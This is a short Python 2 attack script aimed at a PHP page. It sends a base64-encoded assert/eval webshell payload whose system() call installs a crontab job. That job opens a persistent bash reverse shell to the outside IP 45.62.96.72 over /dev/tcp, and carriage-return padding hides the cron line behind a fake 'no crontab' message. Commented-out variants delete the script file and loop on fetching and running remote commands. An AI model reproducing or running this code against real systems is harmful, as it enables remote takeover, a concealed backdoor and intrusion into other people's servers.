# coding:utf-8

import requests
import base64


t = "assert($_REQUEST['m0xiaoxi'])"
t = base64.b64encode(t)
url = "http://127.0.0.1/429/index.php?xx="+t

#system = "system('ls ./');"
#unlink($_SERVER['SCRIPT_FILENAME']);
# system = """
# ignore_user_abort(true);
# set_time_limit(0);

# while (true) {
#     $str = file_get_contents('http://localhost/429/test.txt');
#     system($str);
#     sleep(10);
# }
# """
system = '''
system('crontab -l;echo  \"* * * * * bash -c \'exec 9<> /dev/tcp/45.62.96.72/23335&&exec 0<&9&&exec 1>&9 2>&1&&/bin/bash --noprofile -i\'&&\rno crontab for `whoami`%150c\n\"|crontab -');
'''
print system
code = base64.b64encode(system)
#print code
payload = {'m0xiaoxi':'@eval(base64_decode($_POST[z0]));','z0':code}
r = requests.post(url, data = payload)
#r = requests.get(url)
print r.content
print r